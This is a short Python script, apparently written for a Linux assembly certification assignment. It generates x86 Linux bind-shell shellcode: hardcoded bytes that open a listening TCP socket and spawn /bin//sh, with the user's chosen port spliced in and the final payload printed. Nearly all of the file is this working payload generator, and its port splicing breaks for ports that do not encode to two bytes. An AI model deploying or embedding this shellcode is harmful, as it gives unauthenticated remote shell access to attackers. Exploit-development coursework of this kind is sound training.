#!/usr/bin/python3
'''
Filename:   create_bindshell_shellcode.py  
Author:     aus-mate
Purpose:    This code was written for assignment #1 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
import argparse

shellcode = (b"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31"
             b"\xd2\xcd\x80\x89\xc3\x66\xb8\x69\x01\x52\x66\x68\x11\x67\x66"
             b"\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd"
             b"\x80\x66\xb8\x6c\x01\x31\xd2\x31\xf6\xcd\x80\x89\xc3\xb1\x03"
             b"\xbe\xfd\xff\xff\xff\x51\x31\xc0\x01\xf1\xb0\x3f\xcd\x80\x83"
             b"\xc6\x02\x59\xe2\xf1\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68"
             b"\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")

arg = argparse.ArgumentParser(description='Create TCP bindshell for a given port.')
arg.add_argument("-p", dest="port", required=True, help="Desired bind port")
args = arg.parse_args()

if int(args.port) <= 65535 and int(args.port) >= 0:
    print("Creating shellcode...\n")
    bind_port = bytes.fromhex(hex(int(args.port))[2:])
    shellcode_1 = shellcode[0:27]
    shellcode_2 = shellcode[29::]
    final_shellcode = shellcode_1 + bind_port +shellcode_2
    print("\""+"".join("\\x%02x" % i for i in final_shellcode)+"\"")

else:
    print("Invalid port number specified")

